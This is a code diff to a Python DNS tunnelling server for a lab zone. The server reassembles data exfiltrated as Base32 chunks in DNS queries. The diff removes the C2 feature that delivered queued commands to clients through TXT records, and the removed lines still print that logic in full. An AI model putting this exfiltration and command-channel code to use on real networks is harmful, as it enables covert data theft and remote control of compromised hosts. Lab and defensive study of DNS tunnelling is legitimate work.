@@ -7,10 +7,9 @@ Authoritative for the zone  tunnel.lab
 Query protocol
 --------------
   DATA  :  <b32_chunk>.<seq>.<session>.tunnel.lab   → A  1.0.0.1  (ACK)
-  POLL  :  cmd.<session>.tunnel.lab                 → TXT <b32_command> | "none"
 
 The server reconstructs the exfiltrated payload by reassembling
-ordered Base32 chunks, and can queue a C2 command for the client.
+ordered Base32 chunks.
 """
 
 import base64
@@ -21,7 +20,7 @@ import threading
 import time
 from collections import defaultdict
 
-from dnslib import A, QTYPE, RCODE, RR, TXT
+from dnslib import A, QTYPE, RCODE, RR
 from dnslib.server import BaseResolver, DNSServer
 
 # ── Logging ───────────────────────────────────────────────────
@@ -44,22 +43,15 @@ class TunnelResolver(BaseResolver):
         <base32_chunk> . <seq_number> . <session_id> . tunnel . lab
         └───────────────────────────────────────────────────────────
                               DATA query
-
-        cmd . <session_id> . tunnel . lab
-        └──────────────────────────────────
-                              C2 POLL
     """
 
     def __init__(self):
         self._lock = threading.Lock()
         # session_id  →  { seq_int: b32_chunk_str }
         self._sessions: dict[str, dict[int, str]] = defaultdict(dict)
-        # session_id  →  pending command string (UTF-8)
-        self._commands: dict[str, str] = {}
         self._stats = {
             "queries_total": 0,
             "queries_tunnel": 0,
-            "queries_cmd": 0,
             "bytes_received": 0,
             "start_time": time.time(),
         }
@@ -86,22 +78,6 @@ class TunnelResolver(BaseResolver):
 
         if not sub:
             reply.add_answer(RR(qname, QTYPE.A, rdata=A("10.10.0.10"), ttl=0))
-            return reply
-
-        # ── C2 poll:  cmd.<session>.tunnel.lab ───────────────
-        if sub[0] == "cmd":
-            session_id = sub[1] if len(sub) > 1 else "default"
-            with self._lock:
-                self._stats["queries_cmd"] += 1
-                cmd = self._commands.pop(session_id, "")
-            if cmd:
-                encoded_cmd = base64.b32encode(cmd.encode()).decode().lower()
-                reply.add_answer(
-                    RR(qname, QTYPE.TXT, rdata=TXT(encoded_cmd), ttl=0)
-                )
-                log.info(f"→ Command delivered to [{session_id}]: {cmd!r}")
-            else:
-                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("none"), ttl=0))
             return reply
 
         # ── Data chunk:  <chunk>.<seq>.<session>.tunnel.lab ──
@@ -149,11 +125,6 @@ class TunnelResolver(BaseResolver):
             log.error(f"Decode error: {exc}")
             return None
 
-    def queue_command(self, session_id: str, command: str):
-        with self._lock:
-            self._commands[session_id] = command
-        log.info(f"← Queued command for [{session_id}]: {command!r}")
-
     def print_stats(self):
         with self._lock:
             s = dict(self._stats)
@@ -161,8 +132,7 @@ class TunnelResolver(BaseResolver):
         log.info(
             f"[stats] uptime={uptime:.0f}s | "
             f"total={s['queries_total']} | "
-            f"tunnel={s['queries_tunnel']} | "
-            f"cmd_polls={s['queries_cmd']}"
+            f"tunnel={s['queries_tunnel']}"
         )
 
     def _log_event(self, event: dict):
